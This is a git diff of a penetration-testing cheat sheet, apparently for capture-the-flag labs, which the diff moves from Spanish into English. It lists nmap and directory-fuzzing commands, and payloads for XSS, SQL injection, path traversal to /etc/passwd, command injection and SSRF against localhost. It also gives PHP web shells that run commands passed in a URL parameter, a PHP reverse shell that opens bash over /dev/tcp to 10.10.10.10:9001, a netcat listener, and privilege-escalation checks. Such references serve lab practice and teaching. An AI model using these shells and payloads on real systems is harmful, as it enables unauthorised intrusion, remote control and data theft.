@@ -1,79 +1,79 @@
 # HACKMEX Cheat Sheet
 
-## Conceptos
+## Networking
 
-**Internet Protocol (IP)**: identifica un dispositivo.
-
-**Puertos**: identifica un servicio/app corriendo en un dispositivo.
-
-Ejemplo formato `/etc/hosts`:
+Example format for `/etc/hosts`:
 
 ```text
-10.10.10.10 www.example.com
+10.10.10.10 www.example.com api.example.com
 ```
 
-Ejemplo formato URL:
-
-```text
-http://www.example.com:80/path/to/file.html?key1=value1&key2=value2#ID
-```
-
-## VPN
-
-Conexión VPN:
+Connect to VPN:
 
 ```bash
 sudo openvpn config.ovpn
 ```
 
-Obtener IP local:
+Get VPN IP:
 
 ```bash
 ip a show tun0
 ```
 
-## Metodología
+## Methodology
 
-### Enumeración
+### Enumeration
 
-Identificar OS (Linux TTL=64, Windows TTL=128):
+Identify OS (Linux TTL=64, Windows TTL=128):
 
 ```bash
 ping -c 1 10.10.10.10
 ```
 
-Descubrir puertos (80=http, 443=https):
+Find open ports:
 
 ```bash
-sudo nmap -sT -v -oN scan.txt -Pn -p21,22,80,111,389,1883,2718,3000,4000,4567,5000,5050,5572,5672,5678,6379,8000,8080,8081,8161,8443,9000,61613,61614,61616 10.10.10.10
+sudo nmap -p- --open -v -n -Pn -oN TCP0.txt -sS --min-rate 5000 10.10.10.10
+```
+
+Scan open ports:
+
+```bash
+sudo nmap -sC -sV -oN TCP1.txt -p22,80,443 10.10.10.10
 ```
 
 ### Web
 
-Descubrir tecnologías:
+Discover technologies:
 
 ```bash
-whatweb http://www.example.com
+whatweb 'http://www.example.com'
 ```
 
-Descubrir contenido:
+Discover files and directories:
+
+```bash
+ffuf -c -u 'http://www.example.com/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
 
 ```bash
 gobuster dir -t 64 -u 'http://www.example.com' -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
-Diccionario de directorios: `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`
+Dictionary for directories: `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`
 
-Diccionario de archivos: `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`
+Dictionary for files: `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`
 
-### Vulnerabilidades
+### Vulnerabilities
 
-SQLi:
+XSS:
 
-```text
-/search?id=5'
-/search?id=5' or 1=1-- -
-/search?id=5' or sleep(5)-- -
+```html
+<b>bold text</b>
+<marquee>moving</marquee>
+<script>alert(1);</script>
+<img src="x" onerror="alert(1)">
+<svg onload="alert(1)">
 ```
 
 IDOR:
@@ -82,6 +82,14 @@ IDOR:
 /account?id=1
 /account?id=2
 /account?id=3
+```
+
+LFI:
+
+```text
+/?page=/etc/passwd
+/?page=../../../etc/passwd
+/?page=../../../../../../etc/passwd
 ```
 
 Command injection:
@@ -93,45 +101,59 @@ command1 | command2
 command1 && command2
 ```
 
-LFI:
+File upload:
 
-```text
-/?page=/etc/passwd
-/?page=../../../etc/passwd
-/?page=../../../../../../etc/passwd
+```php
+<php phpinfo(); ?>
 ```
 
-File upload:
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
 
 ```php
 <?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'"); ?>
 ```
 
-```php
-<?php echo file_get_contents('/etc/passwd'); ?>
+SQLi:
+
+```text
+/search?id=5'
+/search?id=5' OR 1=1-- -
+/search?id=5' OR SLEEP(5)-- -
 ```
 
-### Explotación
+SSRF:
 
-Esperar conexión:
+```text
+/show?url=http://www.example.com/people
+/show?url=http://10.10.10.10/test
+/show?url=http://127.0.0.1/admin
+/show?url=http://127.0.0.1:8000
+/show?url=http://127.0.0.1:8080
+```
+
+### Exploitation
+
+Wait for connections:
 
 ```bash
-nc -lvnp 9001
+ncat -lvnp 9001
 ```
 
 Reverse shells: <https://www.revshells.com/>
 
-Tratamiento de la TTY: <https://invertebr4do.github.io/tratamiento-de-tty/>
+TTY treatment: <https://invertebr4do.github.io/tratamiento-de-tty/>
 
-### Escalamiento de Privilegios
+### Privilege Escalation
 
-Permisos de `sudo`:
+Permissions with `sudo`:
 
 ```bash
 sudo -l
 ```
 
-Encontrar binarios SUID:
+Find SUID binaries:
 
 ```bash
 find / -perm -4000 2>/dev/null
